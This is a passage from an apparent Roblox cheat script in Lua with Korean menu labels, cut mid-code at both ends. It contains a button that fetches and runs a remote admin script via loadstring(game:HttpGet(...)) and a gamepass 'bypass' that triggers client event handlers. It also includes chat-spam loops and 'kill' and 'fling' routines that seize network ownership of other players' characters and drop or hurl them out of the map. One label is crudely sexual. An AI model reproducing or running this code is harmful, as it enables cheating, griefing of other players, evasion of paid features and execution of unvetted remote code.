            end
        end)
    end,
})

-- 5. 머리 크기 변경 (시각용)
UtilityTab:CreateSlider({
    Name = "머리 크기 조절",
    Range = {0, 100},
    Increment = 1,
    CurrentValue = 1,
    Callback = function(Value)
        pcall(function()
            local head = plr.Character and plr.Character:FindFirstChild("Head")
            if head then
                head.Size = Vector3.new(Value, Value, Value)
            end
        end)
    end,
})

-- 6. 내 이름 숨기기 (로컬 전용)
UtilityTab:CreateToggle({
    Name = "내 머리위 이름표 제거",
    CurrentValue = false,
    Callback = function(Value)
        pcall(function()
            local head = plr.Character and plr.Character:FindFirstChild("Head")
            if head then
                local bgui = head:FindFirstChildOfClass("BillboardGui")
                if bgui then bgui.Enabled = not Value end
            end
        end)
    end,
})

UtilityTab:CreateSection("시스템 유틸")

-- 7. 핑 확인
UtilityTab:CreateButton({
    Name = "현재 핑(Ping) 확인",
    Callback = function()
        pcall(function()
            local ping = math.floor(game:GetService("Stats").Network.ServerStatsItem["Data Ping"]:GetValue())
            Rayfield:Notify({Title = "시스템", Content = "현재 핑: "..ping.."ms", Duration = 3})
        end)
    end,
})

-- 8. 물리 렉 감소
UtilityTab:CreateButton({
    Name = "물리 렉 최적화",
    Callback = function()
        pcall(function()
            for _, v in pairs(workspace:GetDescendants()) do
                if v:IsA("BasePart") then
                    v.Velocity = Vector3.new(0,0,0)
                    v.RotVelocity = Vector3.new(0,0,0)
                end
            end
        end)
    end,
})

-- 9. 서버 인원수 확인
UtilityTab:CreateButton({
    Name = "서버 총 인원수 확인",
    Callback = function()
        local count = #game.Players:GetPlayers()
        Rayfield:Notify({Title = "서버 정보", Content = "현재 인원: "..count.."명", Duration = 3})
    end,
})

-- 10. 채팅창 숨기기/보이기
UtilityTab:CreateToggle({
    Name = "채팅 UI 숨기기",
    CurrentValue = false,
    Callback = function(Value)
        pcall(function()
            plr.PlayerGui.Chat.Frame.Visible = not Value
        end)
    end,
})


UtilityTab:CreateSection("물리 및 엔진 조작")

UtilityTab:CreateToggle({
    Name = "무마찰 모드 (미끄러지기)",
    CurrentValue = false,
    Callback = function(Value)
        pcall(function()
            local char = game.Players.LocalPlayer.Character
            for _, v in pairs(char:GetChildren()) do
                if v:IsA("BasePart") then
                    v.CustomPhysicalProperties = PhysicalProperties.new(Value and 0 or 0.7, 0.3, 0.5)
                end
            end
        end)
    end,
})


local clicking = false


UtilityTab:CreateButton({
    Name = "모든 화면 효과 제거 (깔끔한 시야)",
    Callback = function()
        pcall(function()
            local lighting = game:GetService("Lighting")
            for _, v in pairs(lighting:GetChildren()) do
                if v:IsA("PostProcessEffect") or v:IsA("BloomEffect") or v:IsA("BlurEffect") then
                    v.Enabled = false
                end
            end
        end)
    end,
})

UtilityTab:CreateSection("플레이어 특수 조작")

-- 4. 1인칭 강제 고정 (조준 시 유용)
UtilityTab:CreateToggle({
    Name = "강제 1인칭 시점",
    CurrentValue = false,
    Callback = function(Value)
        pcall(function()
            game.Players.LocalPlayer.CameraMode = Value and Enum.CameraMode.LockFirstPerson or Enum.CameraMode.Classic
        end)
    end,
})


UtilityTab:CreateSlider({
    Name = "캐릭터 회전 민감도",
    Range = {1, 10},
    Increment = 1,
    CurrentValue = 3,
    Callback = function(Value)
        pcall(function()
            game.Players.LocalPlayer.Character.Humanoid.AutoRotate = true
            
        end)
    end,
})



UtilityTab:CreateButton({
    Name = "맵 전체 오브젝트 개수 스캔",
    Callback = function()
        local count = #workspace:GetDescendants()
        Rayfield:Notify({Title="스캔 완료", Content="현재 맵에 "..count.."개의 물체가 있습니다.", Duration=3})
    end,
})


UtilityTab:CreateButton({
    Name = "서버훅v2",
    Callback = function()
        pcall(function()
            local HttpService = game:GetService("HttpService")
            local TPS = game:GetService("TeleportService")
            local Servers = HttpService:JSONDecode(game:HttpGet("https://games.roblox.com/v1/games/"..game.PlaceId.."/servers/Public?sortOrder=Asc&limit=100"))
            for _, s in pairs(Servers.data) do
                if s.playing < s.maxPlayers and s.id ~= game.JobId then
                    TPS:TeleportToPlaceInstance(game.PlaceId, s.id, game.Players.LocalPlayer)
                    break
                end
            end
        end)
    end,
})

UtilityTab:CreateSection("이동 최적화")

UtilityTab:CreateToggle({
    Name = "관성 제거   <font color='rgb(0,255,0)'>[굳]</font>",
    CurrentValue = true,
    Callback = function(Value)
        _G.NoInertia = Value
        pcall(function()
            local char = game.Players.LocalPlayer.Character
            local hum = char and char:FindFirstChildOfClass("Humanoid")
            
            if _G.NoInertia then
                
                for _, v in pairs(char:GetChildren()) do
                    if v:IsA("BasePart") then
                        v.CustomPhysicalProperties = PhysicalProperties.new(100, 0.3, 0.5)
                    end
                end
                
                
                task.spawn(function()
                    while _G.NoInertia do
                        if hum and hum.MoveDirection.Magnitude <= 0 then
                            local hrp = char:FindFirstChild("HumanoidRootPart")
                            if hrp then
                                hrp.Velocity = Vector3.new(0, hrp.Velocity.Y, 0)
                            end
                        end
                        task.wait()
                    end
                end)
            else
                
                for _, v in pairs(char:GetChildren()) do
                    if v:IsA("BasePart") then
                        v.CustomPhysicalProperties = nil
                    end
                end
            end
        end)
    end,
})





RankTab:CreateSection("제작자")
RankTab:CreateLabel("제작자 : baby_Alpaca | 알파카")

RankTab:CreateSection("친구 목록")
RankTab:CreateLabel("헬로, 썸머, 누나, 이에스, 까망, 연우, 온유, 대환, 서은")

RankTab:CreateSection("어드민 권한 획득")

local AdminHackButton = RankTab:CreateButton({
    Name = "iY 어드민 핵",
    Callback = function()
        loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
        
        Rayfield:Notify({
            Title = "🔓 iY 어드민",
            Content = "Infinite Yield 어드민 스크립트가 실행되었습니다.",
            Duration = 5
        })
    end
})
passTab:CreateSection("커스텀 그라데이션 설정")

passTab:CreateInput({
   Name = "그라데이션 레이어 수 설정 (2 ~ 4)",
   PlaceholderText = "기본값: 2",
   RemoveTextAfterFocusLost = false,
   Callback = function(text)
      local num = tonumber(text)
      if num and num >= 2 and num <= 4 then
         GradientLayers = math.floor(num)
         if CustomGradientEnabled and game:GetService("ReplicatedStorage"):FindFirstChild("DataEvents") then
            pcall(function()
               local points = {}
               if GradientLayers == 2 then
                  points = {ColorSequenceKeypoint.new(0, Color1), ColorSequenceKeypoint.new(1, Color2)}
               elseif GradientLayers == 3 then
                  points = {ColorSequenceKeypoint.new(0, Color1), ColorSequenceKeypoint.new(0.5, Color2), ColorSequenceKeypoint.new(1, Color3_Val or Color3.new(0,0,0))}
               elseif GradientLayers == 4 then
                  points = {ColorSequenceKeypoint.new(0, Color1), ColorSequenceKeypoint.new(0.33, Color2), ColorSequenceKeypoint.new(0.66, Color3_Val or Color3.new(0,0,0)), ColorSequenceKeypoint.new(1, Color4 or Color3.new(0,1,0))}
               end
               game:GetService("ReplicatedStorage").DataEvents.UpdateLineColorsEvent:FireServer(ColorSequence.new(points))
            end)
         end
      else
         Rayfield:Notify({
            Name = "Error",
            Content = "Layer amount must be between 2 and 4.",
            Duration = 3,
            Image = 4483345998,
         })
      end
   end,
})

passTab:CreateColorPicker({
    Name = "색상 1",
    Color = Color3.new(1, 0, 0),
    Callback = function(color)
        Color1 = color
        if CustomGradientEnabled and game:GetService("ReplicatedStorage"):FindFirstChild("DataEvents") then
            pcall(function()
               local points = {}
               if GradientLayers == 2 then points = {ColorSequenceKeypoint.new(0, Color1), ColorSequenceKeypoint.new(1, Color2)}
               elseif GradientLayers == 3 then points = {ColorSequenceKeypoint.new(0, Color1), ColorSequenceKeypoint.new(0.5, Color2), ColorSequenceKeypoint.new(1, Color3_Val or Color3.new(0,0,0))}
               elseif GradientLayers == 4 then points = {ColorSequenceKeypoint.new(0, Color1), ColorSequenceKeypoint.new(0.33, Color2), ColorSequenceKeypoint.new(0.66, Color3_Val or Color3.new(0,0,0)), ColorSequenceKeypoint.new(1, Color4 or Color3.new(0,1,0))} end
               game:GetService("ReplicatedStorage").DataEvents.UpdateLineColorsEvent:FireServer(ColorSequence.new(points))
            end)
        end
    end
})

passTab:CreateColorPicker({
    Name = "색상 2",
    Color = Color3.new(0, 0, 1),
    Callback = function(color)
        Color2 = color
        if CustomGradientEnabled and game:GetService("ReplicatedStorage"):FindFirstChild("DataEvents") then
            pcall(function()
               local points = {}
               if GradientLayers == 2 then points = {ColorSequenceKeypoint.new(0, Color1), ColorSequenceKeypoint.new(1, Color2)}
               elseif GradientLayers == 3 then points = {ColorSequenceKeypoint.new(0, Color1), ColorSequenceKeypoint.new(0.5, Color2), ColorSequenceKeypoint.new(1, Color3_Val or Color3.new(0,0,0))}
               elseif GradientLayers == 4 then points = {ColorSequenceKeypoint.new(0, Color1), ColorSequenceKeypoint.new(0.33, Color2), ColorSequenceKeypoint.new(0.66, Color3_Val or Color3.new(0,0,0)), ColorSequenceKeypoint.new(1, Color4 or Color3.new(0,1,0))} end
               game:GetService("ReplicatedStorage").DataEvents.UpdateLineColorsEvent:FireServer(ColorSequence.new(points))
            end)
        end
    end
})

passTab:CreateColorPicker({
    Name = "색상 3",
    Color = Color3.new(0, 0, 0),
    Callback = function(color)
        Color3_Val = color
        if CustomGradientEnabled and game:GetService("ReplicatedStorage"):FindFirstChild("DataEvents") then
            pcall(function()
               local points = {}
               if GradientLayers == 2 then points = {ColorSequenceKeypoint.new(0, Color1), ColorSequenceKeypoint.new(1, Color2)}
               elseif GradientLayers == 3 then points = {ColorSequenceKeypoint.new(0, Color1), ColorSequenceKeypoint.new(0.5, Color2), ColorSequenceKeypoint.new(1, Color3_Val)}
               elseif GradientLayers == 4 then points = {ColorSequenceKeypoint.new(0, Color1), ColorSequenceKeypoint.new(0.33, Color2), ColorSequenceKeypoint.new(0.66, Color3_Val), ColorSequenceKeypoint.new(1, Color4 or Color3.new(0,1,0))} end
               game:GetService("ReplicatedStorage").DataEvents.UpdateLineColorsEvent:FireServer(ColorSequence.new(points))
            end)
        end
    end
})

passTab:CreateColorPicker({
    Name = "색상 4",
    Color = Color3.new(1, 1, 0),
    Callback = function(color)
        Color4 = color
        if CustomGradientEnabled and game:GetService("ReplicatedStorage"):FindFirstChild("DataEvents") then
            pcall(function()
               local points = {}
               if GradientLayers == 2 then points = {ColorSequenceKeypoint.new(0, Color1), ColorSequenceKeypoint.new(1, Color2)}
               elseif GradientLayers == 3 then points = {ColorSequenceKeypoint.new(0, Color1), ColorSequenceKeypoint.new(0.5, Color2), ColorSequenceKeypoint.new(1, Color3_Val or Color3.new(0,0,0))}
               elseif GradientLayers == 4 then points = {ColorSequenceKeypoint.new(0, Color1), ColorSequenceKeypoint.new(0.33, Color2), ColorSequenceKeypoint.new(0.66, Color3_Val or Color3.new(0,0,0)), ColorSequenceKeypoint.new(1, Color4)} end
               game:GetService("ReplicatedStorage").DataEvents.UpdateLineColorsEvent:FireServer(ColorSequence.new(points))
            end)
        end
    end
})

passTab:CreateToggle({
   Name = "커스텀 그라데이션 적용  <font color='rgb(255,0,0)'>[오너]</font>",
   CurrentValue = false,
   Flag = "CustomGradientToggle",
   Callback = function(val)
      CustomGradientEnabled = val
      if val then
          RainbowLoopEnabled = false 
          if game:GetService("ReplicatedStorage"):FindFirstChild("DataEvents") then
              pcall(function()
                 local points = {}
                 if GradientLayers == 2 then points = {ColorSequenceKeypoint.new(0, Color1), ColorSequenceKeypoint.new(1, Color2)}
                 elseif GradientLayers == 3 then points = {ColorSequenceKeypoint.new(0, Color1), ColorSequenceKeypoint.new(0.5, Color2), ColorSequenceKeypoint.new(1, Color3_Val or Color3.new(0,0,0))}
                 elseif GradientLayers == 4 then points = {ColorSequenceKeypoint.new(0, Color1), ColorSequenceKeypoint.new(0.33, Color2), ColorSequenceKeypoint.new(0.66, Color3_Val or Color3.new(0,0,0)), ColorSequenceKeypoint.new(1, Color4 or Color3.new(0,1,0))} end
                 game:GetService("ReplicatedStorage").DataEvents.UpdateLineColorsEvent:FireServer(ColorSequence.new(points))
              end)
          end
      end
   end,
})

passTab:CreateSection("라인 색상 고정 프리셋")

passTab:CreateButton({
   Name = "무지개 프리셋 (고정 고해상도)",
   Callback = function()
      CustomGradientEnabled = false
      RainbowLoopEnabled = false
      if game:GetService("ReplicatedStorage"):FindFirstChild("DataEvents") then
          pcall(function()
             game:GetService("ReplicatedStorage").DataEvents.UpdateLineColorsEvent:FireServer(ColorSequence.new({
                ColorSequenceKeypoint.new(0, Color3.new(1,0,0)),
                ColorSequenceKeypoint.new(0.16, Color3.new(1,1,0)),
                ColorSequenceKeypoint.new(0.33, Color3.new(0,1,0)),
                ColorSequenceKeypoint.new(0.5, Color3.new(0,1,1)),
                ColorSequenceKeypoint.new(0.66, Color3.new(0,0,1)),
                ColorSequenceKeypoint.new(0.83, Color3.new(1,0,1)),
                ColorSequenceKeypoint.new(1, Color3.new(1,0,0))
             }))
          end)
      end
   end,
})

passTab:CreateButton({
   Name = "불꽃 프리셋 (레드/오렌지/옐로우)",
   Callback = function()
      CustomGradientEnabled = false
      RainbowLoopEnabled = false
      if game:GetService("ReplicatedStorage"):FindFirstChild("DataEvents") then
          pcall(function()
             game:GetService("ReplicatedStorage").DataEvents.UpdateLineColorsEvent:FireServer(ColorSequence.new({
                ColorSequenceKeypoint.new(0, Color3.new(1,0,0)),
                ColorSequenceKeypoint.new(0.5, Color3.new(1,0.5,0)),
                ColorSequenceKeypoint.new(1, Color3.new(1,1,0))
             }))
          end)
      end
   end,
})

passTab:CreateButton({
   Name = "바다 프리셋 (딥블루/아쿠아)",
   Callback = function()
      CustomGradientEnabled = false
      RainbowLoopEnabled = false
      if game:GetService("ReplicatedStorage"):FindFirstChild("DataEvents") then
          pcall(function()
             game:GetService("ReplicatedStorage").DataEvents.UpdateLineColorsEvent:FireServer(ColorSequence.new({
                ColorSequenceKeypoint.new(0, Color3.new(0,0,1)),
                ColorSequenceKeypoint.new(0.5, Color3.new(0,1,1)),
                ColorSequenceKeypoint.new(1, Color3.new(0,0.5,0.5))
             }))
          end)
      end
   end,
})

passTab:CreateButton({
   Name = "석양 프리셋 (퍼플/핑크/오렌지)",
   Callback = function()
      CustomGradientEnabled = false
      RainbowLoopEnabled = false
      if game:GetService("ReplicatedStorage"):FindFirstChild("DataEvents") then
          pcall(function()
             game:GetService("ReplicatedStorage").DataEvents.UpdateLineColorsEvent:FireServer(ColorSequence.new({
                ColorSequenceKeypoint.new(0, Color3.new(0.5,0,0.5)),
                ColorSequenceKeypoint.new(0.5, Color3.new(1,0,0.5)),
                ColorSequenceKeypoint.new(1, Color3.new(1,0.5,0))
             }))
          end)
      end
   end,
})

passTab:CreateButton({
   Name = "네온 프리셋 (민트/마젠타)",
   Callback = function()
      CustomGradientEnabled = false
      RainbowLoopEnabled = false
      if game:GetService("ReplicatedStorage"):FindFirstChild("DataEvents") then
          pcall(function()
             game:GetService("ReplicatedStorage").DataEvents.UpdateLineColorsEvent:FireServer(ColorSequence.new({
                ColorSequenceKeypoint.new(0, Color3.new(0,1,1)),
                ColorSequenceKeypoint.new(1, Color3.new(1,0,1))
             }))
          end)
      end
   end,
})

passTab:CreateSection("실시간 애니메이션 효과")

passTab:CreateToggle({
   Name = "실시간 무지개 그라데이션 루프",
   CurrentValue = false,
   Flag = "RainbowLoopToggle",
   Callback = function(val)
      RainbowLoopEnabled = val
      if val then
          CustomGradientEnabled = false
          task.spawn(function()
              while RainbowLoopEnabled do
                  for i = 0, 1, 0.01 do
                      if not RainbowLoopEnabled then break end
                      if game:GetService("ReplicatedStorage"):FindFirstChild("DataEvents") then
                          pcall(function()
                              game:GetService("ReplicatedStorage").DataEvents.UpdateLineColorsEvent:FireServer(ColorSequence.new({
                                  ColorSequenceKeypoint.new(0, Color3.fromHSV(i, 1, 1)),
                                  ColorSequenceKeypoint.new(1, Color3.fromHSV((i + 0.5) % 1, 1, 1))
                              }))
                          end)
                      end
                      task.wait(0.05)
                  end
              end
          end)
      end
   end,
})

passTab:CreateSection("게임패스 잠금해제")

passTab:CreateButton({
   Name = "긴줄 잠금해제   <font color='rgb(255,19,130)'>[바이패싱]</font>",
   Callback = function()
      local Reach = Instance.new("BoolValue")
      Reach.Name = "FartherReach"
      Reach.Parent = game.Players.LocalPlayer
      Reach.Value = true

      local GamepassEvents = game:GetService("ReplicatedStorage"):FindFirstChild("GamepassEvents")
      local Notifier = GamepassEvents and GamepassEvents:FindFirstChild("FurtherReachBoughtNotifier")

      if Notifier and getconnections then
         local ran = false
         for _, connection in ipairs(getconnections(Notifier.OnClientEvent)) do
            pcall(connection.Function)
            ran = true
         end
         if ran then
            Rayfield:Notify({
               Name = "Success",
               Content = "긴줄잠금해제완료!",
               Duration = 4,
               Image = 10734951437
            })
         else
            Rayfield:Notify({
               Name = "Failed",
               Content = "긴줄잠금해제실패!",
               Duration = 4,
               Image = 10734925828
            })
         end
      else
         Rayfield:Notify({
            Name = "Failed",
            Content = "긴줄잠금해제실패!",
            Duration = 4,
            Image = 10734925828
         })
      end
   end,
})


getTab:CreateSection("Gam")
getTab:CreateToggle({
    Name = "킥알림    <font color='rgb(255,10,123)'>[프라임]</font>",
    CurrentValue = true,
    Flag = "5",
    Callback = function(Value)
        ifKickThenT = Value
        if Value then
            ifKickThenF()
        end
    end
})

headMatrix = {0,0,0,0,0,0,0,1,0}
torsoMatrix = {0,0,0,0,0,0,0,1,0}
rightArmMatrix = {0,0,2,0,0,0,0,0,1}
DevTab:CreateToggle({ 
    Name = "락", 
    CurrentValue = false,
    Flag = "ToggleSpam",
    Callback = function(Value)
        isSpamming = Value

        if isSpamming then
            if heartbeatConnection then
                heartbeatConnection:Disconnect()
            end

            heartbeatConnection = rs2.Heartbeat:Connect(function()
                rs.CharacterEvents.Look:FireServer(
                    CFrame.new(0, 0, 0, headMatrix[1], headMatrix[2], headMatrix[3], headMatrix[4], headMatrix[5], headMatrix[6], headMatrix[7], headMatrix[8], headMatrix[9]),
                    CFrame.new(0, 0, 0, torsoMatrix[1], torsoMatrix[2], torsoMatrix[3], torsoMatrix[4], torsoMatrix[5], torsoMatrix[6], torsoMatrix[7], torsoMatrix[8], torsoMatrix[9]),
                    CFrame.new(0, 0, 0, rightArmMatrix[1], rightArmMatrix[2], rightArmMatrix[3], rightArmMatrix[4], rightArmMatrix[5], rightArmMatrix[6], rightArmMatrix[7], rightArmMatrix[8], rightArmMatrix[9]),
                    "high"
                )
            end)
        else
            if heartbeatConnection then
                heartbeatConnection:Disconnect()
                heartbeatConnection = nil
            end
--[[
            rs.CharacterEvents.Look:FireServer(
                CFrame.new(0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0),
                CFrame.new(0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0),
                CFrame.new(0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0),
                intensity
            )
]]--
        end
    end
})

local HR = DevTab:CreateInput({
    Name = "대가리 회전",
    CurrentValue = "0,0,0,0,0,0,0,1,0",
    PlaceholderText = "xx, xy, xz, yx, yy, yz, zx, zy, zz",
    RemoveTextAfterFocusLost = false,
    Flag = "HeadMatrix",
    Callback = function(Value)
        local numbers = {}
        for num in Value:gmatch("[^,]+") do
            table.insert(numbers, tonumber(num) or 0)
        end

        for i = 1, 9 do
            headMatrix[i] = numbers[i] or 0
        end
    end
})

local TR = DevTab:CreateInput({
    Name = "몸통회전",
    CurrentValue = "0,0,0,0,0,0,0,1,0",
    PlaceholderText = "xx, xy, xz, yx, yy, yz, zx, zy, zz",
    RemoveTextAfterFocusLost = false,
    Flag = "TorsoMatrix",
    Callback = function(Value)
        local numbers = {}
        for num in Value:gmatch("[^,]+") do
            table.insert(numbers, tonumber(num) or 0)
        end

        for i = 1, 9 do
            torsoMatrix[i] = numbers[i] or 0
        end
    end
})

local ARA = DevTab:CreateInput({
    Name = "오른팔 회전(딸딸이치기)",
    CurrentValue = "0,0,2,0,0,0,0,0,1",
    PlaceholderText = "xx, xy, xz, yx, yy, yz, zx, zy, zz",
    RemoveTextAfterFocusLost = false,
    Flag = "ArmMatrix",
    Callback = function(Value)
        local numbers = {}
        for num in Value:gmatch("[^,]+") do
            table.insert(numbers, tonumber(num) or 0)
        end

        for i = 1, 9 do
            rightArmMatrix[i] = numbers[i] or 0
        end
    end
})

DevTab:CreateButton({
    Name = "리셋",
    Callback = function()

headMatrix = {0,0,0,0,0,0,0,1,0}
torsoMatrix = {0,0,0,0,0,0,0,1,0}
rightArmMatrix = {0,0,2,0,0,0,0,0,1}

HR:Set("0,0,0,0,0,0,0,1,0")
TR:Set("0,0,0,0,0,0,0,1,0")
ARA:Set("0,0,2,0,0,0,0,0,1")

    end
})

local TextChatService = game:GetService("TextChatService")
local RunService = game:GetService("RunService")

DevTab:CreateSection("Chat")
DevTab:CreateInput({
    Name = "소리",
    CurrentValue = "",
    PlaceholderText = "Value",
    RemoveTextAfterFocusLost = false,
    Flag = "SoundInput",
    Callback = function(Value)
        spamText = tostring(Value)
    end
})

DevTab:CreateInput({
    Name = "소리 나오는 속도",
    CurrentValue = "",
    PlaceholderText = "Value",
    RemoveTextAfterFocusLost = false,
    Flag = "SpeedInput",
    Callback = function(Value)
        local num = tonumber(Value)
        if num and num > 0 then
            SpeedSpam = num
        else
            SpeedSpam = 0.1
        end
    end
})

DevTab:CreateToggle({ 
    Name = "토클", 
    CurrentValue = false,
    Flag = "SpamToggle",
    Callback = function(Value)
        spamming = Value

        if spamConnection then
            spamConnection:Disconnect()
            spamConnection = nil
        end

        if Value then
            local accumulator = 0

            spamConnection = RunService.Heartbeat:Connect(function(deltaTime)
                if not spamming then 
                    return 
                end

                accumulator = accumulator + deltaTime
                if accumulator >= SpeedSpam then
                    accumulator = 0

                    local success, errorMsg = pcall(function()
                        local message = "/e " .. (spamText)
                        TextChatService.TextChannels.RBXGeneral:SendAsync(message)
                    end)
                end
            end)
        end
    end
})
DevTab:CreateSection("열차")
DevTab:CreateButton({
    Name = "열차조종   <font color='rgb(0,155,0)'>[삭제]</font>",
    Callback = TrSw
})

LoopTab:CreateSection("특별기능")
local Loop1 = LoopTab:CreateToggle({
    Name = "PTM",
    CurrentValue = false,
    Flag = "21",
    Callback = function(Value)
        loopPlayerT3 = Value
        if loopPlayerT3 then
            table.clear(playersInLoop2V)
            for i, e in ipairs(playersInLoop1V) do
                local nameOnly = e:match("^(.-) %(") or e
                table.insert(playersInLoop2V, nameOnly)
            end
            loopPlayerF3()
        else
            loopPlayerT3 = false
            table.clear(playersInLoop2V)
        end
    end
})

LoopTab:CreateButton({
    Name = "킬    <font color='rgb(255,0,0)'>[오너]</font>",
    Callback = function()
        table.clear(playersInLoop2V)
        for i, e in ipairs(playersInLoop1V) do
            local nameOnly = e:match("^(.-) %(") or e
            table.insert(playersInLoop2V, nameOnly)
        end
        
        UpdateCurrentBlobman()
        
        for _, name in ipairs(playersInLoop2V) do
            local player = game.Players:FindFirstChild(name)
            if player and not table.find(Whitelist, player.Name) then
                local character, hrp, head = safeGetCharacterParts(player)
                local humanoid = character and character:FindFirstChildOfClass("Humanoid")
                if PPs:FindFirstChild(name) or inv:FindFirstChild(name) then continue end
                
                if humanoid and humanoid.Health > 0 then
                    local myChar = plr.Character
                    local myHrp = myChar and myChar:FindFirstChild("HumanoidRootPart")
                    if not myHrp then continue end
                    local originCF = myHrp.CFrame
                    
                    TP(player)
                    task.wait(0.1)
                    
                    while true do
                        rs.GrabEvents.SetNetworkOwner:FireServer(head, head.CFrame)
                        local ownerTag = head:FindFirstChild("PartOwner")
                        if ownerTag and ownerTag:IsA("StringValue") and ownerTag.Value == plr.Name then
                            break
                        end
                        task.wait()
                    end
                    
                    if humanoid.RigType ~= Enum.HumanoidRigType.R15 and humanoid.SeatPart == nil then humanoid.RigType = Enum.HumanoidRigType.R15 end

                    if humanoid.BreakJointsOnDeath == true and humanoid.SeatPart == nil then humanoid.BreakJointsOnDeath = false end

                    if head:FindFirstChildOfClass("BallSocketConstraint") then head.BallSocketConstraint.Attachment0 = nil end

                    local FallenY = workspace.FallenPartsDestroyHeight
                    local targetY = (FallenY <= -50000 and -49999) or (FallenY <= -100 and -99) or -100
                    local storso = character:FindFirstChild("Torso")
                    if storso then
                        storso.CFrame = CFrame.new(storso.Position.X, targetY, storso.Position.Z)
                    end
                    
                    if originCF then BACK(originCF) end
                end
                task.wait(0.1)
            end
        end
    end
})

LoopTab:CreateButton({
    Name = "날리기    <font color='rgb(255,0,0)'>[오너]</font>",
    Callback = function()
        table.clear(playersInLoop2V)
        for i, e in ipairs(playersInLoop1V) do
            local nameOnly = e:match("^(.-) %(") or e
            table.insert(playersInLoop2V, nameOnly)
        end
        
        UpdateCurrentBlobman()
        
        for _, name in ipairs(playersInLoop2V) do
            local player = game.Players:FindFirstChild(name)
            if player and not table.find(Whitelist, player.Name) then
                local character, hrp, head = safeGetCharacterParts(player)
                if PPs:FindFirstChild(name) or inv:FindFirstChild(name) then continue end
                
                local myChar = plr.Character
                local myHrp = myChar and myChar:FindFirstChild("HumanoidRootPart")
                if not myHrp then continue end
                local originCF = myHrp.CFrame
                
                local tpRunning = true
                task.spawn(function()
                    while tpRunning do
                        local ok, cf = TP(player)
                        if ok and cf then
                            CF = cf
                        end
                        task.wait()
                    end
                end)

                while true do
                    rs.GrabEvents.SetNetworkOwner:FireServer(hrp, hrp.CFrame)
                    local ownerTag = head:FindFirstChild("PartOwner")
                    if ownerTag and ownerTag:IsA("StringValue") and ownerTag.Value == plr.Name then
                        break
                    end
                    task.wait()
                end

                tpRunning = false

                local targetNames = {
                    "NinjaKunai", "NinjaShuriken", "NinjaKatana",
                    "ToolCleaver", "ToolDiggingForkRusty",
                    "ToolPencil", "ToolPickaxe"
                }

                for _, child in ipairs(workspace:GetChildren()) do
                    if child:IsA("Folder") and child.Name:match("SpawnedInToys$") then
                        for _, item in ipairs(child:GetChildren()) do
                            if table.find(targetNames, item.Name) and item:FindFirstChild("StickyPart") then
                                local sticky = item.StickyPart
                                local weld = sticky:FindFirstChild("StickyWeld")
                                if weld and weld:IsA("WeldConstraint") and weld.Part1 then
                                    local targetParts = {
                                        character:FindFirstChild("대가리"),
                                        character:FindFirstChild("T"),
                                        character:FindFirstChild("왼팔"),
                                        character:FindFirstChild("왼발"),
                                        character:FindFirstChild("오른팔"),
                                        character:FindFirstChild("오른발"),
                                        hrp:FindFirstChild("RagdollTouchedHitbox"),
                                        hrp:FindFirstChild("FirePlayerPart"),
                                    }
                                    for _, tPart in ipairs(targetParts) do
                                        if tPart and weld.Part1 == tPart then
                                            local basePart = item.PrimaryPart or sticky
                                            if basePart and (basePart.Position - hrp.Position).Magnitude <= 10 then
                                                rs.GrabEvents.SetNetworkOwner:FireServer(sticky, sticky.CFrame)
                                                sticky.CFrame = CFrame.new(0,9999,0)
                                            end
                                        end
                                    end
                                end
                            end
                        end
                    end
                end

                rs.GrabEvents.DestroyGrabLine:FireServer(head, head.CFrame)
                hrp.CFrame = CFrame.new(99999999, 99999999, 99999999)

                if originCF then
                    BACK(originCF)
                end
                task.wait(0.1)
            end
        end
    end
})


DevTab:CreateToggle({
    Name = "wd 소환 (상대안티킥 해제)",
    CurrentValue = false,
    Flag = "5",
    Callback = function(Value)
        AntiStickyGBT = Value
        if Value then
            AntiStickyGBF()
        end
    end
})

local RRButton = LoopTab:CreateButton({
    Name = "릴리즈    <font color='rgb(255,154,123)'>[블롭맨]</font>",
    Callback = function()
        table.clear(playersInLoop2V)
	for i, e in ipairs(playersInLoop1V) do
		local nameOnly = e:match("^(.-) %(") or e
		table.insert(playersInLoop2V, nameOnly)
	end
        BlobReleaseR()
    end
})

local LGButton = LoopTab:CreateButton({
    Name = "메슬리즈   <font color='rgb(255,154,123)'>[블롭맨]</font>",
    Callback = function()
        table.clear(playersInLoop2V)
	for i, e in ipairs(playersInLoop1V) do
		local nameOnly = e:match("^(.-) %(") or e
		table.insert(playersInLoop2V, nameOnly)
	end
        BlobMasslessR()
    end
})

local RGButton = LoopTab:CreateButton({
    Name = "잡기   <font color='rgb(255,154,123)'>[블롭맨]</font>",
    Callback = function()
        table.clear(playersInLoop2V)
	for i, e in ipairs(playersInLoop1V) do
		local nameOnly = e:match("^(.-) %(") or e
		table.insert(playersInLoop2V, nameOnly)
	end
        BlobGrabR()
    end
})

local RDButton = LoopTab:CreateButton({
    Name = "놓기   <font color='rgb(255,154,123)'>[블롭맨]</font>",
    Callback = function()
        table.clear(playersInLoop2V)
	for i, e in ipairs(playersInLoop1V) do
		local nameOnly = e:match("^(.-) %(") or e
		table.insert(playersInLoop2V, nameOnly)
	end
        BlobDropR()
    end
})

grabTab:CreateSection("Fling")
local flingToggle = grabTab:CreateToggle({
    Name = "던지기 V1   <font color='rgb(255,0,0)'>[데스크톱]</font>",
    CurrentValue = false,
    Flag = "1",
    Callback = function(Value)
        flingT = Value
        flingF()
    end
})

local strengthInput = grabTab:CreateInput({
    Name = "던지는 힘 V1",
    CurrentValue = 0,
    PlaceholderText = "Value",
    RemoveTextAfterFocusLost = false,
    Flag = "2",
    Callback = function(Value)
        strengthV = Value
    end
})
strengthInput:Set(9999)
grabTab:CreateLabel("모바일의경우 작동하지 않습니다.")
local strengthConnection = nil
local nageru = 800
local lastThrowTime = 0

grabTab:CreateToggle({
    Name = "던지기 V2   <font color='rgb(0,255,0)'>[모바일]</font>",
    Default = false,
    Save = true,
    Flag = "SuperThrow",
    Callback = function(enabled)
        if enabled then
            if strengthConnection then strengthConnection:Disconnect() end

            strengthConnection = workspace.ChildAdded:Connect(function(model)
                if model.Name == "GrabParts" then
                    local grabPart = model:FindFirstChild("GrabPart")
                    if grabPart and grabPart:FindFirstChild("WeldConstraint") then
                        local targetPart = grabPart.WeldConstraint.Part1
                        if targetPart then
                            
                            local bv = Instance.new("BodyVelocity")
                            bv.Name = "SuperThrowBV"
                            bv.MaxForce = Vector3.new(0, 0, 0)
